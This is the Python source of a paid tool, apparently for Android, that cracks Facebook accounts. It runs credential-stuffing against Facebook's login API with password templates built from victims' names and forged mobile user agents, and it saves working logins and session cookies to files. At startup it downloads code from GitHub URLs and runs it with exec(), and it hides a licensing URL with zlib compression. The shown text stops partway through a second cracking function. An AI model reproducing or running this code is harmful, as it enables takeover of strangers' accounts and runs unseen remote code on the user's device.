" ---> @reverse_exec <--- "

import requests
import platform
import re
import shutil
import os
import subprocess
import time
import os,requests,json,time,re,random,sys,uuid,string,subprocess,zlib,platform
import marshal
import os,base64
from os import system as clr
print(' WAIT SERVER IS LOADING ...')

import webbrowser
try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError:
    os.system('pip install requests bs4 futures==2 > /dev/null')
except:pass

from datetime import date
today = date.today()
try:
    data = requests.get('https://raw.githubusercontent.com/MUGHAL-X-DOD/dod/main/Review/office').text
    exec(data)
except:
    print('\x1b[1;91m [\x1b[1;92m+\x1b[1;91m]\x1b[1;92m You Have No Internet Connection-l ..!');exit()

try:
    data = requests.get('https://raw.githubusercontent.com/MUGHAL-X-DOD/dod/main/Review/paid').text
    exec(data)
except:
    print('\x1b[1;91m [\x1b[1;92m+\x1b[1;91m]\x1b[1;92m You Have No Internet Connection ..!');exit()

W = '\033[97;1m'
B = '\033[96;1m'
P = '\033[95;1m'
R = '\033[91;1m'
G = '\033[92;1m'

def getKey():
    myid = str(os.getuid())
    myid = myid.upper()[::-1]
    n = re.findall("(\d\d)", myid)
    plat = platform.version()[2:][:8][::-1].upper() + platform.release()[3:][::-1].upper() + platform.version()[:2]
    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    return "DOD-" + myid + xp
km = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\xf7\ru\xf7p\xf4\xd1\x8dp\xd1\x07J\x94\x01\xe52R\x93\xb33\xf3\xd2\xf5s\x133\xf3\x90\xc5\xf4J*J\x00\x9f\x88\x1d\xcc')

def Activate():
    global km
    r = requests.get(km).text
    k = getKey()
    if k in r:
        menu()
        print(f"\033[1;92mYour Token is successfully Approved\33[1;37m")
    else:
        clear()
        print(f" KEY :\x1b[1;97m "+k);line()
        print(' Pakistan Payments Method Details\n Payment Number     :   03239021979\n Easypaisa Number   :   Hammad \n Jazzcash Name      :   Danish \n NayaPay Name       :   Muhammad Hammad')
        print(' 15 Day : 500\n 30 Day : 850');line()
        print(' Others Country Payment Details\n Binance Id : 777822816\n 15 Day : 5$ \n 30 Day : 10$');line()
        input(f' PRESS ENTER TO SEND KEY ADMIN')
        tks = (''+k)
        os.system("xdg-open https://wa.me/+923239021979")
try:
    os.makedirs('/sdcard/MUGHAL')
except:
        pass
sys.stdout.write('\x1b]2;MUGHAL-XD\x07')

logo = (f"""\033[1;37m
       ______   _______  ______
      (  __  \ (  ___  )(  __  \
      | (  \  )| (   ) || (  \  )
      | |   ) || |   | || |   ) |
      | |   | || |   | || |   | |
      | |   ) || |   | || |   ) |
      | (__/  )| (___) || (__/  )
      (______/ (_______)(______/
         DAD      OF      DEVIL
-----------------------------------------
 Author  : Muhammad Hammad
 Github  : https://github.com/MUGHAL-XD
 Service : V.4.1 (Premium)
-----------------------------------------""")

loop=0
twf=[]
oks=[]
cps=[]
ok=[]
cp=[]
pcp=[]
id=[]
tokenku=[]

def line():
    print(f" -----------------------------------------")

def clear():
    os.system(f'clear')
    print(logo)

def Free():
    paid = menu()

def menu():
            clear()
            print(f" (1) File Cloning")
            print(f" (2) Random Cloning")
            print(f" (3) File Create")
            print(f" (4) Auto Create fb")
            print(f" (5) Add Auto friends fb")
            print(f" (6) WhatsApp Group")
            print(f" (0) Exit")
            line()

            xd=input(f' Chose : ')
            if xd in ['1','01']:
                clear()
                print(f' Example : /sdcard/filename.txt ')
                line()
                file = input(f' Enter File : ')
                try:
                    fo = open(file,'r').read().splitlines()
                except FileNotFoundError:
                    print(f' FILE NOT FOUND ')
                    time.sleep(1)
                    menu()
                clear()
                print(f' (1) Method 1  ')
                print(f' (2) Method 2  ')
                print(f' (3) Method 3  ')

                line()
                mthd=input(f' Chose : ')
                line()
                plist = []
                try:
                    clear()
                    ps_limit = int(input(f' How many pass do you want to add: '))
                except:
                    ps_limit =1
                clear()
                print(f' Example : first last,firtslast,first123')
                line()
                for i in range(ps_limit):
                    plist.append(input(f' Password {i+1}: '))
                clear()
                print(f' Do you want to show cp ids ? (y/n): ')
                line()
                cx=input(f' Chose : ')
                if cx in ['y','Y','yes','Yes','1']:
                    pcp.append('y')
                else:
                    pcp.append('n')
                with tred(max_workers=50) as crack_submit:
                    clear()
                    total_ids = str(len(fo))
                    print(f' Total ids : \033[1;32m'+total_ids+f' ')
                    print(" DOD Crack Has Been Running \n Use Airplane mode after 2 minutes ")
                    line()
                    for user in fo:
                        ids,names = user.split('|')
                        passlist = plist
                        if mthd in ['1','01']:
                            crack_submit.submit(ffb1,ids,names,passlist)
                        elif mthd in ['2','02']:
                            crack_submit.submit(ffb2,ids,names,passlist)
                        elif mthd in ['3','03']:
                            crack_submit.submit(ffb3,ids,names,passlist)

                print(f'\033[1;37m')
                line()
                print(f' PROCESS COMPLTED')
                print(f"  OK IDZ : %s "%(len(oks)))
                print(f"  CP IDZ : %s "%(len(cps)))
                line()
                input(f' PRESS ENTER TO BACK ')
                menu()
            elif xd in ['2','02']:
                Main_Menu()
            elif xd in ['3','03']:
                files()
            elif xd in ['4','04']:
                Create()
            elif xd in ['5','05']:
                cookii()
            elif xd in ['6','06']:
                os.system('xdg-open https://chat.whatsapp.com/JJfccbKpGu9BChyGH7GoLA')
            elif xd in ['7','07']:
                ipMain()
            elif xd in ['0','00']:
                exit(f' by by ')
            else:
                menu()

def generate_user_agent():
    android_version = random.choice(["9", "10", "11"])
    device_name = random.choice(["Redmi Note 8T", "Redmi 9T", "Redmi Note 10 Pro", "Redmi Note 9", "Redmi 10", "Redmi Note 11", "Redmi 11T", "Redmi 9A", "Redmi Note 8 Pro", "Redmi 9 Power"])
    miui_version = "V" + '.'.join(map(str, random.choices(range(10), k=3)))
    fban = "Orca-Android"
    fbbv = '.'.join(map(str, random.choices(range(10), k=5)))
    fbav = '.'.join(map(str, random.choices(range(10), k=5)))
    fbpn = "com.facebook.orca"
    fblc = random.choice(["pl_PL", "en_US", "fr_FR", "de_DE", "es_ES"])
    fbcr = random.choice(["PLAY (T-Mobile)", "Verizon", "Vodafone", "AT&T"])
    fbmf = "Xiaomi"
    fbbd = "Redmi"
    fbdv = device_name
    fbsv = android_version
    fbca = random.choice(["arm64-v8a", "armeabi-v7a"])
    density = str(random.uniform(1, 3))[:4]
    width = random.randint(500, 1999)
    height = random.randint(999, 2999)
    fb_dm = "{density=" + density + ",width=" + str(width) + ",height=" + str(height) + "}"
    fb_fw = "FB_FW/1"
    user_agent = "Dalvik/2.1.0 (Linux; U; Android " + android_version + "; " + device_name + " MIUI/" + miui_version + ") "
    user_agent += "[FBAN/" + fban + ";FBAV/" + fbav + ";FBPN/" + fbpn + ";FBLC/" + fblc + ";FBBV/" + fbbv + ";FBCR/" + fbcr + ";"
    user_agent += "FBMF/" + fbmf + ";FBBD/" + fbbd + ";FBDV/" + fbdv + ";FBSV/" + fbsv + ";FBCA/" + fbca + ":null;"
    user_agent += "FBDM/" + fb_dm + ";" + fb_fw + "] FBBK/1"
    return user_agent

def ffb1(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r\033[1;37m [MUGHAL-M1] %s|OK:%s'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                        data = {'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'cpl': 'true',
'family_device_id': str(uuid.uuid4()),
'credentials_type': 'device_based_login_password',
'error_detail_type': 'button_with_disabled',
'source': 'register_api',
'email': ids,
'password': pas,
'access_token': '275254692598279|585aec5b4c27376758abb7ffcb9db2af',
'generate_session_cookies': '1',
'meta_inf_fbmeta': 'NO_FILE',
'advertiser_id': str(uuid.uuid4()),
'currently_logged_in_userid': '0',
'locale': code1,
'client_country_code': loc1,
'method': 'auth.login',
'fb_api_req_friendly_name': 'authenticate',
'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
'api_key': '882a8490361da98702bf97a021ddc14d',
'sig': '1d2d2c81b7ac43af4db39465bf23e77e'}
                        headers = {'Authorization': 'OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af',
'X-FB-Net-HNI': '20083',
'User-Agent': generate_user_agent(),
'X-FB-Client-IP': 'True',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-SIM-HNI': '37460',
'X-Tigon-Is-Retry': 'False',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Connection-Quality': 'MOBILE.LTE',
'X-FB-Server-Cluster': 'True',
'Connection': 'keep-alive',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Host': 'graph.facebook.com',
'X-FB-Connection-Bandwidth': '80025933',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'Accept-Encoding': 'gzip, deflate',
'X-FB-Connection-Type': 'MOBILE.LTE',
'Content-Type': 'application/x-www-form-urlencoded'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r \033[1;32m[MUGHAL-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookies = f"sb={ssbb};{coki}"
                                        open('/sdcard/DOD/MUGHAL-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/DOD/MUGHAL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r \033[1;31m[MUGHAL-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/DOD/MUGHAL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            time.sleep(20)

def DOD_UA_2():
    ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
    END = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/bn_BD;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-F9460;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi]"
    ua = random.choice("Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G71 [FBAN/FBIOS;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/15.6;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20C65 [FBAN/FBIOS;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.2;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"
"Mozilla/5.0 (Linux; Android 12; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [ip:37.161.64.112]"
"Mozilla/5.0 (Linux; Android 11; ANY-LX3 Build/HONORANY-L23CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]"
"Mozilla/5.0 (Android 13; Mobile; rv:92.0) Gecko/92.0 Firefox/92.0"
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 [ip:5.179.182.100]"
"Mozilla/5.0 (iPad; CPU OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G82 [FBAN/FBIOS;FBDV/iPad7,5;FBMD/iPad;FBSN/iPadOS;FBSV/15.6.1;FBSS/2;FBID/tablet;FBLC/hu_HU;FBOP/5]"
"Mozilla/5.0 (Linux; Android 10; SM-A415F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 [ip:151.38.7.186]"
"Mozilla/5.0 (Linux; Android 10; CPH1877 Build/QKQ1.190918.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 11; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36 [ip:5.90.206.104]"
"Mozilla/5.0 (Linux; Android 8.0.0; SM-A320FL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:37.162.95.86]"
"Mozilla/5.0 (Linux; Android 11; M2006C3MII Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 10; SM-A105M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.73 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/393.0.0.35.106;]"
"Dalvik/2.1.0 (Linux; U; Android 12; XQ-BQ52 Build/61.1.A.11.88)"
"Mozilla/5.0 (Linux; Android 8.0.0; SM-A320FL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:95.233.113.192]"
"Mozilla/5.0 (Linux; Android 11; SM-A307FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/336.0.0.11.99;]"
"Mozilla/5.0 (Linux; Android 11; Infinix X659B Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 [ip:2.38.213.218]"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36 [ip:93.37.161.40]"
"Mozilla/5.0 (Linux; Android 12; SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:217.171.69.0]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 DuckDuckGo/7 Safari/605.1.15 [ip:151.82.199.110]"
"Mozilla/5.0 (Linux; Android 7.1.1; XT1562 Build/NPD26.48-24-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 11; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 [ip:193.207.218.132]"
"Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:151.43.17.209]"
"Mozilla/5.0 (Linux; Android 12; CPH2273) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:37.163.216.67]"
"Mozilla/5.0 (Linux; Android 10; Mi 9 Lite Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]"
"Mozilla/5.0 (Linux; Android 12; CPH2211) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:151.36.227.107]"
"Mozilla/5.0 (Linux; Android 9; SM-G970F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]"
"Mozilla/5.0 (Linux; Android 11; M2010J19SL Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]"
"Mozilla/5.0 (Linux; Android 11; SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 [ip:146.241.238.242]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 265.0.0.13.302 (iPhone13,2; iOS 16_2; en_US; en-US; scale=3.00; 1170x2532; 435784589)"
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/246.0.498775878 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0 [ip:93.40.193.17]"
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5528.0 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"Mozilla/5.0 (Linux; Android 11; RMX3201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36 [ip:37.162.110.189]"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 [ip:2.47.8.31]"
"Mozilla/5.0 (Linux; Android 11; SM-A202F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36 [ip:37.159.72.118]"
"Mozilla/5.0 (Linux; Android 12; 2201117TY Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Instagram 264.0.0.22.106 Android (31/12; 440dpi; 1080x2177; Xiaomi/Redmi; 2201117TY; spesn; qcom; it_IT; 430370703)"
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 [ip:5.11.115.243]"
"Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36 (Ecosia android@101.0.4951.41) [ip:151.38.102.110]"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.76 [ip:151.50.5.136]"
"Mozilla/5.0 (Linux; Android 13; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36 [ip:93.32.172.138]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 264.3.0.19.104 (iPhone12,1; iOS 16_0; tr_TR; tr-TR; scale=2.00; 828x1792; 432065435)"
"Mozilla/5.0 (Linux; Android 11; SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:2.199.201.101]"
"Mozilla/5.0 (Linux; Android 11; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36 [ip:151.19.231.88]"
"Mozilla/5.0 (Linux; Android 9; AMN-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:151.44.28.106]"
"Mozilla/5.0 (Linux; Android 10; MAR-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:37.163.200.220]"
"Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:5.90.47.0]"
"Mozilla/5.0 (Linux; Android 10; G91) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 11; SM-A202F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:37.163.4.225]"
"Mozilla/5.0 (Linux; Android 12; CPH2273) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:37.161.151.175]"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.4 Safari/605.1.15 [ip:87.26.201.184]"
"Dalvik/2.1.0 (Linux; U; Android 6.0.1; Vestel_5530 Build/VP1270)"
"Mozilla/5.0 (Linux; Android 9; SM-A105FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:91.80.15.115]"
"Mozilla/5.0 (Linux; Android 11; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36 [ip:151.43.73.197]"
"Mozilla/5.0 (Linux; Android 12; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:93.35.68.134]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 265.0.0.13.302 (iPhone13,4; iOS 16_1_1; tr_TR; tr-TR; scale=3.00; 1284x2778; 435784589) NW/3"
"Mozilla/5.0 (Linux; Android 12; M2103K19G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:79.23.191.109]"
"Mozilla/5.0 (Linux; Android 9; LG-H870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.80 Mobile Safari/537.36 [ip:5.91.167.58]"
"Mozilla/5.0 (Linux; Android 13; SM-T220) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
"Mozilla/5.0 (Linux; Android 7.0; ASUS_X018D Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18B92 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/14.2;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5] [ip:37.160.74.250]"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 [ip:2.196.207.53]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 265.0.0.13.302 (iPhone14,3; iOS 16_2; it_IT; it-IT; scale=3.00; 1284x2778; 435784589) NW/3"
"Mozilla/5.0 (Linux; Android 10; SM-J610FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/336.0.0.11.99;]"
"Mozilla/5.0 (Linux; Android 10; Nokia 3.1 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:109.52.75.43]"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 AtContent/94.5.8454.55"
"Mozilla/5.0 (Linux; Android 5.0.2; SM-G530FZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile Safari/537.36 [ip:151.68.226.52]"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 [ip:93.40.194.96]"
"Mozilla/5.0 (Linux; Android 11; SM-A202F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36 [ip:95.74.110.83]"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 [ip:93.47.36.39]"
"Mozilla/5.0 (Linux; Android 10; SNE-LX1 Build/HUAWEISNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 Instagram 264.0.0.22.106 Android (29/10; 480dpi; 1080x2128; HUAWEI; SNE-LX1; HWSNE; kirin710; it_IT; 430370703)"
"Mozilla/5.0 (Linux; Android 12; vivo 1907 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]"
"Mozilla/5.0 (Linux; Android 10; POCOPHONE F1 Build/QKQ1.190828.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 GNews Android/2022108570"
"Mozilla/5.0 (Linux; Android 12; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:151.72.120.178]"
"Mozilla/5.0 (Linux; Android 12; SM-S908B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]"
"Mozilla/5.0 (Linux; Android 10; Carbon 1 Mark II Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 7.0; Wind Tab 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/108.1.137 like Chrome/108.0.5359.160 Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 [ip:151.49.230.62]"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 [ip:188.251.152.53]"
"Dalvik/2.1.0 (Linux; U; Android 9.1; HY12B Build/O11019)"
"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [ip:93.33.58.125]"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 [ip:151.36.48.157]"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0 [ip:87.14.111.43]"
"Mozilla/5.0 (Linux; Android 9; AEOAT) AppleWebKit/537.36 (KHTML, like Gecko) Silk/108.1.137 like Chrome/108.0.5359.160 Safari/537.36"
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 265.0.0.13.302 (iPhone11,8; iOS 16_1_1; it_IT; it-IT; scale=2.00; 828x1792; 435784589)"
"Mozilla/5.0 (Linux; Android 11; moto g(10)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 EdgA/108.0.1462.54")
    return ua

def ffb2(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r\033[1;37m [MUGHAL-M2] %s|OK:%s'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
